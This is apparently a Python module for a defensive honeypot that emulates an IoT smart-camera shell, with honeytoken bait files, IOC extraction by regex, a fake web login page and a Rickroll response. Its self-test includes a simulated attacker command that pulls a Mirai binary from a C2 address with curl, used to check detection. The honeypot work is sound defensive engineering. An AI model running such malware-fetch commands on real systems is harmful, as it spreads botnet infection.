"""
AegisMirage Phantom Twin Honeypot Engine.

Owner: Member B — honeypot (SSH + web decoy)
Stage: Stage 2 (Phantom Twin Core Decoy & Reverse-Trap Stretch)

Key Responsibilities:
1. In-memory virtual Linux filesystem simulating an IoT smart camera.
2. Bait honeytoken files at multiple depths.
3. High-confidence honeytoken trip detection triggering the internal Rickroll response.
4. Shell command execution (ls, cd, cat, pwd, whoami, uname, curl, wget).
5. Real-time extraction of IOCs: malware hashes (MD5/SHA-256) and C2 addresses/URLs.
6. Emits typed schema.DecoySessionEvent models consumed by Member C (intel.py).
7. Fake camera admin web routes and asyncssh server harness.
"""

from __future__ import annotations

import re
import time
import uuid
from typing import Dict, List, Optional, Tuple

import schema


# =============================================================================
# In-Memory Virtual Filesystem (IoT Camera OS)
# =============================================================================

# Honeytoken marker used to identify high-confidence bait files
HONEYTOKEN_MARKER = "__HONEYTOKEN__"

# Realistic in-memory IoT Camera Linux filesystem
VIRTUAL_FS: Dict[str, object] = {
    "/": ["bin", "etc", "var", "root", "proc", "home"],
    "/bin": ["sh", "busybox", "ls", "cat", "pwd", "uname", "whoami", "curl", "wget"],
    "/proc": ["cpuinfo", "version", "uptime"],
    "/proc/version": "Linux version 5.10.0-aegis-arm64 (gcc 10.2.1) #1 PREEMPT\n",
    "/etc": ["passwd", "shadow", "hosts", "issue", "camera"],
    "/etc/issue": "AegisOS SmartCam IoT Linux 5.10-arm64 \\n \\l\n",
    "/etc/passwd": (
        "root:x:0:0:root:/root:/bin/sh\n"
        "admin:x:1000:1000:Camera Admin:/home/admin:/bin/sh\n"
        "operator:x:1001:1001:Surveillance Operator:/home/operator:/bin/sh\n"
    ),
    "/etc/camera": ["config.json", "credentials.conf"],
    "/etc/camera/config.json": (
        '{\n  "camera_id": "cam-smart-04",\n  "stream": "rtsp://localhost:554/live",\n'
        '  "resolution": "1920x1080",\n  "firmware": "v2.14-stable"\n}\n'
    ),
    # Honeytoken Bait #1 (Depth 2: /etc/camera/credentials.conf)
    "/etc/camera/credentials.conf": (
        f"{HONEYTOKEN_MARKER}\n"
        "# MASTER CAMERA ACCESS TOKEN\n"
        "CAM_TOKEN=sec_token_canary_cam04_9921_x\n"
        "BACKUP_CLOUD_SYNC=https://sync.aegismirage-internal.local/keys\n"
    ),
    "/root": [".bashrc", "keys", "firmware_update.sh"],
    # Honeytoken Bait #2 (Depth 3: /root/keys/vault_token.key)
    "/root/keys": ["vault_token.key", "id_rsa"],
    "/root/keys/vault_token.key": (
        f"{HONEYTOKEN_MARKER}\n"
        "s.vault_canary_token_prod_infrastructure_4418\n"
    ),
    "/var": ["log", "backup", "www"],
    "/var/log": ["messages", "auth.log"],
    # Honeytoken Bait #3 (Depth 3: /var/backup/firmware_pass.enc)
    "/var/backup": ["firmware_pass.enc", "db_dump.sql"],
    "/var/backup/firmware_pass.enc": (
        f"{HONEYTOKEN_MARKER}\n"
        "ENC_PASSPHRASE=mirage_vault_honeytoken_alpha_3991\n"
    ),
    "/home": ["admin", "operator"],
    "/home/admin": ["readme.txt"],
    "/home/admin/readme.txt": "Authorized maintenance only. Contact ICCC operations for credentials.\n",
}

# The Sandboxed Rickroll Response Payload (never touches external systems)
RICKROLL_PAYLOAD = r"""
================================================================================
[*] DECRYPTING SENSITIVE CREDENTIAL ARCHIVE...
[*] ACCESS GRANTED - EXTRACTING SECRETS...
================================================================================
  _   _ _____ _   _ _____ ____    ____   ___  _   _ _   _    _    
 | \ | | ____| | | | ____|  _ \  / ___| / _ \| \ | | \ | |  / \   
 |  \| |  _| | | | |  _| | |_) | \___ \| | | |  \| |  \| | / _ \  
 | |\  | |___ \ \_/ / |___|  _ <   ___) | |_| | |\  | |\  |/ ___ \ 
 |_| \_|_____| \___/|_____|_| \_\ |____/ \___/|_| \_|_| \_/_/   \_\

 🎵 NEVER GONNA GIVE YOU UP, NEVER GONNA LET YOU DOWN 🎵
 🎵 NEVER GONNA RUN AROUND AND DESERT YOU 🎵
 🎵 NEVER GONNA MAKE YOU CRY, NEVER GONNA SAY GOODBYE 🎵
 🎵 NEVER GONNA TELL A LIE AND HURT YOU 🎵
================================================================================
[AEGISMIRAGE PHANTOM TWIN SANDBOX - TRAP TRIGGERED]
HONEYTOKEN COMPROMISE DETECTED.
Your session has been tagged with MAXIMUM CONFIDENCE.
All command telemetry, IOCs, and session metrics are recorded.
================================================================================
"""


# =============================================================================
# Regular Expressions for Automated IOC Extraction
# =============================================================================

# Matches 64-char hex (SHA-256) or 32-char hex (MD5)
REGEX_SHA256 = re.compile(r"\b[a-fA-F0-9]{64}\b")
REGEX_MD5 = re.compile(r"\b[a-fA-F0-9]{32}\b")

# Matches URLs with http/https/ftp/tftp e.g. http://194.26.29.112:8080/mirai.x86
REGEX_URL_C2 = re.compile(r"(?:https?|tftp|ftp)://([a-zA-Z0-9.-]+(?::[0-9]+)?(?:/[^\s]*)?)")

# Matches raw IP with optional port e.g. 194.26.29.112:8080
REGEX_IP_PORT = re.compile(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}(?::[0-9]{2,5})\b")


def extract_iocs(text: str) -> Tuple[Optional[str], Optional[str]]:
    """
    Scans a command string or uploaded payload for malware hashes and C2 addresses.
    Returns (malware_hash, c2_address).
    """
    malware_hash: Optional[str] = None
    c2_address: Optional[str] = None

    # Check for SHA-256 first (strongest IOC)
    sha_match = REGEX_SHA256.search(text)
    if sha_match:
        malware_hash = sha_match.group(0).lower()
    else:
        # Check for MD5
        md5_match = REGEX_MD5.search(text)
        if md5_match:
            malware_hash = md5_match.group(0).lower()

    # Check for C2 URLs (e.g. from curl, wget, tftp)
    url_match = REGEX_URL_C2.search(text)
    if url_match:
        c2_address = url_match.group(0)
    else:
        ip_port_match = REGEX_IP_PORT.search(text)
        if ip_port_match:
            c2_address = ip_port_match.group(0)

    return malware_hash, c2_address


# =============================================================================
# Decoy Session State & Management
# =============================================================================

class DecoySession:
    """Represents an active interactive session trapped inside the honeypot."""

    def __init__(self, session_id: str, source_ip: str, service: str = "ssh") -> None:
        self.session_id: str = session_id
        self.source_ip: str = source_ip
        self.service: str = service
        self.failed_logins: int = 0
        self.commands: List[str] = []
        self.honeytoken_hit: bool = False
        self.malware_hash: Optional[str] = None
        self.c2_address: Optional[str] = None
        self.current_dir: str = "/"
        self.created_at: float = time.time()
        self.last_active: float = time.time()

    def to_event(self) -> schema.DecoySessionEvent:
        """Export session state strictly conforming to shared schema.py."""
        return schema.DecoySessionEvent(
            session_id=self.session_id,
            source_ip=self.source_ip,
            service=self.service,
            failed_logins=self.failed_logins,
            commands=list(self.commands),
            honeytoken_hit=self.honeytoken_hit,
            malware_hash=self.malware_hash,
            c2_address=self.c2_address,
        )


class DecoyManager:
    """Manages all active honeypot sessions and virtual execution."""

    def __init__(self) -> None:
        self.sessions: Dict[str, DecoySession] = {}

    def reset(self) -> None:
        """Clear all sessions for test runs."""
        self.sessions.clear()

    def get_or_create_session(
        self,
        session_id: Optional[str] = None,
        source_ip: str = "127.0.0.1",
        service: str = "ssh",
    ) -> DecoySession:
        """Retrieve existing session or spawn a new tracked session."""
        if not session_id or session_id not in self.sessions:
            sid = session_id or f"sess-{uuid.uuid4().hex[:8]}"
            session = DecoySession(session_id=sid, source_ip=source_ip, service=service)
            self.sessions[sid] = session
            print(f"[Decoy] Spawned new {service.upper()} decoy session {sid} for {source_ip}")
            return session
        return self.sessions[session_id]

    def record_login_attempt(
        self,
        session_id: str,
        source_ip: str,
        service: str,
        username: str,
        password: str,
        success: bool = False,
    ) -> schema.DecoySessionEvent:
        """Log an authentication attempt against the decoy."""
        session = self.get_or_create_session(session_id, source_ip, service)
        if not success:
            session.failed_logins += 1
            print(f"[Decoy] Auth failure #{session.failed_logins} on {service} by {source_ip} ({username}:{password})")
        else:
            print(f"[Decoy] Auth SUCCESS on decoy {service} by {source_ip} ({username}:{password})")
        
        session.last_active = time.time()
        return session.to_event()

    def execute_command(self, session_id: str, cmd_line: str) -> Tuple[str, schema.DecoySessionEvent]:
        """
        Executes a command inside the virtual filesystem sandbox.
        Returns (stdout_text, updated_DecoySessionEvent).
        """
        session = self.get_or_create_session(session_id)
        cmd_line = cmd_line.strip()
        if not cmd_line:
            return "", session.to_event()

        session.commands.append(cmd_line)
        session.last_active = time.time()
        print(f"[Decoy] [{session.session_id} @ {session.source_ip}]$ {cmd_line}")

        # Step 1: Scan command line for IOCs (malware hashes, C2 addresses/URLs)
        hash_found, c2_found = extract_iocs(cmd_line)
        if hash_found:
            session.malware_hash = hash_found
            print(f"[Decoy] [*] IOC DISCOVERED: Malware Hash = {hash_found}")
        if c2_found:
            session.c2_address = c2_found
            print(f"[Decoy] [*] IOC DISCOVERED: C2 Server = {c2_found}")

        # Step 2: Parse command tokens
        parts = cmd_line.split()
        verb = parts[0].lower()
        args = parts[1:]

        # Step 3: Virtual Shell Execution
        if verb == "pwd":
            return f"{session.current_dir}\n", session.to_event()

        elif verb == "whoami":
            return "root\n", session.to_event()

        elif verb == "uname" or verb == "uname -a":
            return "Linux aegis-smartcam-01 5.10.0-arm64 #1 PREEMPT aarch64 GNU/Linux\n", session.to_event()

        elif verb == "ls":
            target_path = session.current_dir if not args else self._resolve_path(session.current_dir, args[0])
            if target_path in VIRTUAL_FS:
                node = VIRTUAL_FS[target_path]
                if isinstance(node, list):
                    return "  ".join(node) + "\n", session.to_event()
                return f"{args[0]}\n", session.to_event()
            return f"ls: cannot access '{args[0] if args else ''}': No such file or directory\n", session.to_event()

        elif verb == "cd":
            if not args or args[0] == "~":
                session.current_dir = "/root"
                return "", session.to_event()
            target_path = self._resolve_path(session.current_dir, args[0])
            if target_path in VIRTUAL_FS and isinstance(VIRTUAL_FS[target_path], list):
                session.current_dir = target_path
                return "", session.to_event()
            return f"cd: {args[0]}: No such file or directory\n", session.to_event()

        elif verb == "cat":
            if not args:
                return "cat: missing file operand\n", session.to_event()
            
            target_path = self._resolve_path(session.current_dir, args[0])
            if target_path in VIRTUAL_FS:
                content = VIRTUAL_FS[target_path]
                if isinstance(content, str):
                    # CHECK FOR HONEYTOKEN BAIT
                    if HONEYTOKEN_MARKER in content:
                        session.honeytoken_hit = True
                        print(f"[Decoy] [!] HONEYTOKEN TRIGGERED in session {session.session_id} by {session.source_ip} on {target_path}!")
                        # Trigger Rickroll reverse-trap sequence!
                        return RICKROLL_PAYLOAD, session.to_event()
                    return content, session.to_event()
                return f"cat: {args[0]}: Is a directory\n", session.to_event()
            return f"cat: {args[0]}: No such file or directory\n", session.to_event()

        elif verb in ("curl", "wget", "tftp"):
            # Command simulating payload pull from C2
            return f"Connected to remote host... File saved.\n", session.to_event()

        elif verb == "help":
            return "AegisOS SmartCam Diagnostic Shell\nSupported commands: ls, cd, cat, pwd, whoami, uname, curl, wget, exit\n", session.to_event()

        elif verb == "exit":
            return "Session disconnected by remote host.\n", session.to_event()

        else:
            return f"sh: {verb}: command not found\n", session.to_event()

    def _resolve_path(self, current: str, path: str) -> str:
        """Resolve a relative or absolute Unix path within the virtual filesystem."""
        if path.startswith("/"):
            normalized = path.rstrip("/")
            return normalized if normalized else "/"

        if path == "..":
            if current == "/":
                return "/"
            parent = "/".join(current.rstrip("/").split("/")[:-1])
            return parent if parent else "/"

        if current == "/":
            return f"/{path}".rstrip("/")
        return f"{current}/{path}".rstrip("/")

    def get_all_session_events(self) -> List[schema.DecoySessionEvent]:
        """Export all session events for Member C and the dashboard."""
        return [s.to_event() for s in self.sessions.values()]

    def get_session_event(self, session_id: str) -> Optional[schema.DecoySessionEvent]:
        """Retrieve a specific session event."""
        if session_id in self.sessions:
            return self.sessions[session_id].to_event()
        return None


# Single in-memory manager instance for the single-process backend
_decoy_manager = DecoyManager()


# =============================================================================
# Public Module API
# =============================================================================

def record_decoy_login(
    session_id: str,
    source_ip: str,
    service: str,
    username: str,
    password: str,
    success: bool = False,
) -> schema.DecoySessionEvent:
    """Record a login attempt on SSH or Web Decoy."""
    return _decoy_manager.record_login_attempt(session_id, source_ip, service, username, password, success)


def execute_decoy_command(session_id: str, cmd_line: str) -> Tuple[str, schema.DecoySessionEvent]:
    """Execute a command in the decoy sandbox."""
    return _decoy_manager.execute_command(session_id, cmd_line)


def get_active_sessions() -> List[schema.DecoySessionEvent]:
    """Get all current DecoySessionEvents."""
    return _decoy_manager.get_all_session_events()


def get_session_by_id(session_id: str) -> Optional[schema.DecoySessionEvent]:
    """Get DecoySessionEvent by ID."""
    return _decoy_manager.get_session_event(session_id)


def reset_decoy_state() -> None:
    """Reset all decoy sessions."""
    _decoy_manager.reset()


# =============================================================================
# Fake Camera Web Admin HTML Template (For FastAPI Web Decoy)
# =============================================================================

FAKE_CAMERA_LOGIN_HTML = """
<!DOCTYPE html>
<html>
<head>
  <title>AegisCam Enterprise IoT Portal - Login</title>
  <style>
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0c1017; color: #e6edf3; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
    .box { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 2rem; width: 340px; box-shadow: 0 8px 24px rgba(0,0,0,0.5); }
    h2 { font-size: 1.25rem; margin-bottom: 0.5rem; color: #58a6ff; }
    p { font-size: 0.85rem; color: #8b949e; margin-bottom: 1.5rem; }
    input { width: 100%; padding: 0.6rem; margin-bottom: 1rem; background: #0d1117; border: 1px solid #30363d; border-radius: 6px; color: #fff; box-sizing: border-box; }
    button { width: 100%; padding: 0.65rem; background: #238636; border: none; border-radius: 6px; color: #fff; font-weight: 600; cursor: pointer; }
    button:hover { background: #2ea043; }
  </style>
</head>
<body>
  <div class="box">
    <h2>AegisCam Portal</h2>
    <p>Smart City Integrated Camera Node v2.14</p>
    <form method="POST" action="/api/decoy/web/login">
      <input type="text" name="username" placeholder="Username (default: admin)" required />
      <input type="password" name="password" placeholder="Password" required />
      <button type="submit">Sign In to Camera Feed</button>
    </form>
  </div>
</body>
</html>
"""


# =============================================================================
# Standalone Self-Test Block (Work Plan Section 9 Requirement)
# =============================================================================

if __name__ == "__main__":
    print("\n" + "=" * 60)
    print("AegisMirage — Phantom Twin Decoy Self-Test (Member B)")
    print("=" * 60)

    reset_decoy_state()

    # Step 1: Simulate attacker connecting and attempting failed logins
    sid = "test-attacker-session-01"
    attacker_ip = "194.26.29.112"
    ev1 = record_decoy_login(sid, attacker_ip, "ssh", "root", "123456", success=False)
    assert ev1.failed_logins == 1
    assert ev1.source_ip == attacker_ip

    # Step 2: Attacker runs basic discovery commands
    out_pwd, _ = execute_decoy_command(sid, "pwd")
    assert "/" in out_pwd

    out_uname, _ = execute_decoy_command(sid, "uname")
    assert "Linux" in out_uname

    out_ls, _ = execute_decoy_command(sid, "ls /etc/camera")
    assert "credentials.conf" in out_ls

    # Step 3: Attacker pulls malware payload with C2 address and hash
    malware_cmd = "curl http://185.220.101.5:8080/mirai.arm -o /tmp/bot && echo d41d8cd98f00b204e9800998ecf8427e"
    _, ev_iocs = execute_decoy_command(sid, malware_cmd)
    assert ev_iocs.c2_address == "http://185.220.101.5:8080/mirai.arm", f"Expected C2 URL, got {ev_iocs.c2_address}"
    assert ev_iocs.malware_hash == "d41d8cd98f00b204e9800998ecf8427e", f"Expected MD5 hash, got {ev_iocs.malware_hash}"
    assert len(ev_iocs.commands) == 4

    # Step 4: Attacker accesses honeytoken bait file (/etc/camera/credentials.conf)
    assert not ev_iocs.honeytoken_hit
    out_trap, ev_trap = execute_decoy_command(sid, "cat /etc/camera/credentials.conf")
    assert ev_trap.honeytoken_hit is True, "Honeytoken hit flag must be True!"
    assert "NEVER GONNA GIVE YOU UP" in out_trap, "Rickroll payload must be returned!"

    print("\n All Decoy Honeypot self-tests passed successfully!\n")
